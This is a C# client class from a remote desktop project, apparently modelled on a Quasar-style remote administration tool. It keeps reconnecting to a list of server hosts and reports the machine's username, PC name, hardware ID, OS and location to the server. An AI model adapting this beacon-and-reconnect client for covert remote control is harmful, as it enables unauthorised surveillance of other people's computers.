using FKRemoteDesktop.Configs;
using FKRemoteDesktop.Debugger;
using FKRemoteDesktop.Helpers;
using FKRemoteDesktop.Message;
using FKRemoteDesktop.Message.SubMessages;
using FKRemoteDesktop.Network;
using FKRemoteDesktop.Structs;
using FKRemoteDesktop.Utilities;
using System;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Framework
{
    public class FKClient : Client, IDisposable
    {
        private bool _identified;                               // 客户端是否已被服务器识别
        private readonly HostsManager _hosts;                   // 主机管理器，管理可连接的主机
        private readonly SafeRandom _random;                    // 随机数生成器，用来轻微随机重连的延迟时间
        private readonly CancellationTokenSource _tokenSource;  // 创建一个 CancellationToken 并发出取消信号
        private readonly CancellationToken _token;              // 用于检查是否取消的 CancellationToken

        public FKClient(HostsManager hostsManager, X509Certificate2 serverCertificate)
            : base(serverCertificate)
        {
            this._hosts = hostsManager;
            this._random = new SafeRandom();
            this._tokenSource = new CancellationTokenSource();
            this._token = _tokenSource.Token;
            base.ClientState += OnClientState;
            base.ClientRead += OnClientRead;
            base.ClientFail += OnClientFail;
        }

        // 收到了服务器某个消息
        private void OnClientRead(Client client, IMessage message, int messageLength)
        {
            if (!_identified)
            {
                // 客户端验证消息特殊处理
                if (message.GetType() == typeof(ClientIdentificationResult))
                {
                    var reply = (ClientIdentificationResult)message;
                    _identified = reply.Result;
                    if (_identified)
                    {
                        Logger.Log(Enums.ELogType.eLogType_Info, "客户端已通过服务器验证.");
                    }
                    else
                    {
                        Logger.Log(Enums.ELogType.eLogType_Error, "客户端未通过服务器验证.");
                    }
                }
                return;
            }

            MessageHandler.Process(client, message);
        }

        private void OnClientFail(Client client, Exception ex)
        {
            client.Disconnect();
        }

        private void OnClientState(Client client, bool connected)
        {
            _identified = false; // 重置身份识别

            if (connected)
            {
                // 一旦连接，立刻发送客户端标识信息
                var geoInfo = GeoInformationHelper.GetGeoInformation();
                var userAccount = new SUserAccount();
                var clientIdentification = new ClientIdentification
                {
                    Version = SettingsFromClient.VERSION,
                    OperatingSystem = PlatformHelper.FullName,
                    AccountType = userAccount.Type.ToString(),
                    Country = geoInfo.Country,
                    CountryCode = geoInfo.CountryCode,
                    ImageIndex = geoInfo.ImageIndex,
                    Id = HardwareDevicesHelper.HardwareId,
                    Username = userAccount.UserName,
                    PcName = SystemHelper.GetPcName(),
                    Tag = SettingsFromServer.TAG,
                    EncryptionKey = SettingsFromServer.ENCRYPTIONKEY,
                    Signature = Convert.FromBase64String(SettingsFromServer.SERVERSIGNATURE)
                };

                Logger.Log(Enums.ELogType.eLogType_Debug, "发送客户端信息给服务器: \r\n" + clientIdentification);

                client.Send(clientIdentification);
            }
        }

        // 连接主循环
        public void ConnectLoop()
        {
            while (!_token.IsCancellationRequested)
            {
                if (!Connected)
                {
                    SHost host = _hosts.GetNextHost();
                    base.Connect(host.IpAddress, host.Port);
                }

                while (Connected) // 保持客户端打开状态
                {
                    try
                    {
                        _token.WaitHandle.WaitOne(1000);
                    }
                    catch (Exception e) when (e is NullReferenceException || e is ObjectDisposedException)
                    {
                        Disconnect();
                        return;
                    }
                }

                if (_token.IsCancellationRequested)
                {
                    Disconnect();
                    return;
                }

                Thread.Sleep((SettingsFromServer.RECONNECTDELAY * 1000) + _random.Next(250, 750));
            }
        }

        // 退出消息循环并断开连接
        public void Exit()
        {
            _tokenSource.Cancel();
            Disconnect();
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _tokenSource.Cancel();
                _tokenSource.Dispose();
            }
        }
    }
}